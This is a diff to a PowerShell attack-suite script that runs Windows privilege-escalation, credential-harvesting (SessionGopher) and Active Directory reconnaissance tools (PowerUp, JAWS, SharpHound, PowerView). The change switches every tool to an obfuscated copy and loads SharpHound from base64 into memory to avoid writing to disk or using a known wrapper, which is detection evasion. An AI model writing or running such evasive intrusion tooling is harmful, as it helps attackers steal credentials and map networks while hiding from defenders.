@@ -14,28 +14,29 @@ $log = Join-Path $out ("suite-{0:yyyyMMdd-HHmmss}.log" -f (Get-Date))
 Start-Transcript -Path $log | Out-Null
 
 function Run-PowerUp {
-    Write-Host '[RUN] PowerUp Invoke-AllChecks' -ForegroundColor Cyan
-    . (Join-Path $tools 'PowerUp.ps1')
+    Write-Host '[RUN] PowerUp Invoke-AllChecks (obfuscated)' -ForegroundColor Cyan
+    . (Join-Path $tools '..\tools-obf\PowerUp.ps1')
     Invoke-AllChecks
 }
 function Run-Jaws {
-    Write-Host '[RUN] JAWS enum' -ForegroundColor Cyan
-    . (Join-Path $tools 'jaws-enum.ps1')
+    Write-Host '[RUN] JAWS enum (obfuscated)' -ForegroundColor Cyan
+    . (Join-Path $tools '..\tools-obf\jaws-enum.ps1')
 }
 function Run-SessionGopher {
-    Write-Host '[RUN] SessionGopher (all)' -ForegroundColor Cyan
-    . (Join-Path $tools 'SessionGopher.ps1')
+    Write-Host '[RUN] SessionGopher (obfuscated)' -ForegroundColor Cyan
+    . (Join-Path $tools '..\tools-obf\SessionGopher.ps1')
     Invoke-SessionGopher -All
 }
 function Run-SharpHound {
-    Write-Host '[RUN] SharpHound via PS wrapper (memory)' -ForegroundColor Cyan
-    # SharpHound.ps1 wrapper embeds the assembly; -c All is broad, scope as needed
-    . (Join-Path $tools 'sharphound' 'SharpHound.ps1')
-    Invoke-BloodHound -CollectionMethod All -Domain $Domain -ZipFileName (Join-Path $out ("bh-{0:yyyyMMdd}.zip" -f (Get-Date)))
+    Write-Host '[RUN] SharpHound via base64 -> memory (no disk, no known wrapper)' -ForegroundColor Cyan
+    . (Join-Path $PSScriptRoot 'InMem-Asm.ps1')
+    $b64 = Join-Path $tools '..\tools-obf\SharpHound.exe.b64'
+    $zip = Join-Path $out ("bh-{0:yyyyMMdd}.zip" -f (Get-Date))
+    Invoke-AsmFromB64 -B64Path $b64 -AsmArgs @('-c','All','-d',$Domain,'--outputdirectory',$out,'--zipfilename',(Split-Path $zip -Leaf))
 }
 function Run-PowerView {
-    Write-Host '[RUN] PowerView quick domain view' -ForegroundColor Cyan
-    . (Join-Path $tools 'PowerView.ps1')
+    Write-Host '[RUN] PowerView quick domain view (obfuscated)' -ForegroundColor Cyan
+    . (Join-Path $tools '..\tools-obf\PowerView.ps1')
     Get-Domain
     Get-DomainController
     Get-DomainTrust
